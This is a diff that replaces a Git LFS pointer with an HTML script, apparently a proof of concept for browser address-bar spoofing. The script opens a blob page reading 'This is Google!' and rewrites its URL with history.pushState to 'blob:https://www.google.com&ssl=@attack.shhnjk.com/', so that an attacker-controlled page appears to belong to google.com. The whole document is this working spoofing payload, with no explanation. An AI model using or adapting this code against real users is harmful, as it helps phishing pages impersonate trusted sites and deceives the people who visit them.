@@ -1,3 +1,6 @@
-version https://git-lfs.github.com/spec/v1
-oid sha256:df59b4ed5165967512410a8481c66084518b59ac5754354bf030aab156e4fd6a
-size 268
+<script>
+    var text = "This is Google!<script>history.pushState('','','blob:https://www.google.com&ssl=@attack.shhnjk.com/')<\/script>";
+    var blob = new Blob([text], {type : 'text/html'});
+    var url = URL.createObjectURL(blob);
+    location.href=url;
+</script>
